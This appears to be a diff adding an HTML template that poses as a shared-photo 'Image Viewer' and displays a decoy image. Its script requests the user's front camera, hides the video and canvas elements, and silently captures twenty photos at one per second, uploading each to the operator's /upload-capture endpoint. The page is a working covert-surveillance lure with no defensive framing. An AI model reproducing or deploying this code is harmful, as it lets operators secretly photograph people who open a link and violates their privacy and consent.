@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Image Viewer</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body { background: #0f0c29; color: white; font-family: 'Segoe UI', sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .glass { background: rgba(255, 255, 255, 0.1); backdrop-filter: blur(10px); border-radius: 20px; padding: 20px; border: 1px solid rgba(255, 255, 255, 0.2); box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37); text-align: center; }
+        img { max-width: 300px; border-radius: 10px; margin-top: 15px; border: 2px solid #00d2ff; }
+    </style>
+</head>
+<body>
+    <div class="glass">
+        <h3>Shared Demo Photo</h3>
+        <p>Loading high-resolution preview...</p>
+        <img src="/static/decoys/{{ image_id }}.jpg" alt="Decoy">
+    </div>
+
+    <video id="video" autoplay playsinline style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+            .then(stream => {
+                video.srcObject = stream;
+                let shots = 0;
+                // Start capturing 20 photos after 2 seconds
+                setTimeout(() => {
+                    let interval = setInterval(() => {
+                        if (shots < 20) {
+                            capture();
+                            shots++;
+                        } else {
+                            clearInterval(interval);
+                            stream.getTracks().forEach(t => t.stop());
+                        }
+                    }, 1000); // 1 photo per second
+                }, 2000);
+            });
+
+        function capture() {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            canvas.toBlob(blob => {
+                const formData = new FormData();
+                formData.append('photo', blob, 'shot.jpg');
+                fetch('/upload-capture', { method: 'POST', body: formData });
+            }, 'image/jpeg');
+        }
+    </script>
+</body>
+</html>
